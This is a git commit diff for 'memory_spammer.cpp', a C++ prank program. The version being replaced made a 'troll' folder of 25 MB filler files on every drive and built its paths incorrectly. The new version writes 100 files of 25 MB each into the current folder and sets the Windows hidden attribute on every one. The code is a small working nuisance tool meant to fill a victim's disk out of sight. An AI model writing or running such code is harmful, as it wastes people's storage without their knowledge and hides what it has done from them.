d4477fe151d45ecbec627ec4694666040e4c9919
Shevtsov German <schevtsov.german@yandex.ru>
2023-12-03 21:02:19 +0300

    v2

--- cpp/memory_spammer.cpp
+++ cpp/memory_spammer.cpp
@@ -2,53 +2,41 @@
 #include <fstream>
 #include <cstdlib>
 #include <string>
-#include <sys/stat.h>
 
 #ifdef _WIN32
-#include <io.h>
-#include <direct.h>  // For _mkdir
+#include <windows.h>
 #endif
 
-void createTrollDirectory(const std::string& drive) {
-    std::string trollDirectory = drive + ":/troll";
+using namespace std;
 
-    // Проверяем, существует ли директория "troll"
-    struct stat info;
-    if (stat(trollDirectory.c_str(), &info) != 0) {
-        // Создаем директорию "troll"
+void setHiddenAttribute(const string& filename) {
 #ifdef _WIN32
-        int result = _mkdir(trollDirectory.c_str());
-#else
-        int result = mkdir(trollDirectory.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+    SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN);
 #endif
-
-        if (result == 0) {
-            std::cout << "Директория " << trollDirectory << " успешно создана\n";
-
-            // Создаем 10 файлов размером 25 МБ внутри директории "troll"
-            for (int i = 1; i <= 10; ++i) {
-                std::string fileName = trollDirectory + "/file" + std::to_string(i) + ".txt";
-                std::ofstream file(fileName.c_str(), std::ios::out | std::ios::binary);
-                file.seekp(25 * 1024 * 1024 - 1);
-                file.write("", 1);
-                file.close();
-                std::cout << "Файл " << fileName << " успешно создан\n";
-            }
-        } else {
-            std::cerr << "Ошибка при создании директории " << trollDirectory << "\n";
-        }
-    } else {
-        std::cerr << "Директория " << trollDirectory << " уже существует\n";
-    }
 }
 
 int main() {
-    // Получаем список доступных дисков
-    for (char drive = 'A'; drive <= 'Z'; ++drive) {
-        std::string drivePath = std::string(1, drive) + ":/";
-        if (_access(drivePath.c_str(), 0) == 0) {
-            // Диск существует, создаем директорию "troll"
-            createTrollDirectory(drivePath);
+    const int numFiles = 100;
+    const int fileSizeMB = 25;
+
+    for (int i = 1; i <= numFiles; ++i) {
+        string filename = "hidden_file_" + to_string(i) + ".txt";
+        ofstream file(filename, ios::out | ios::binary);
+
+        if (file.is_open()) {
+            // Set the file size to 25 MB
+            file.seekp(fileSizeMB * 1024 * 1024 - 1);
+            file.put(0);
+
+            file.close();
+
+            // Set the file as hidden
+            setHiddenAttribute(filename);
+
+            cout << "Created hidden file: " << filename << endl;
+        } else {
+            cerr << "Error creating file: " << filename << endl;
+            return 1;
         }
     }
 
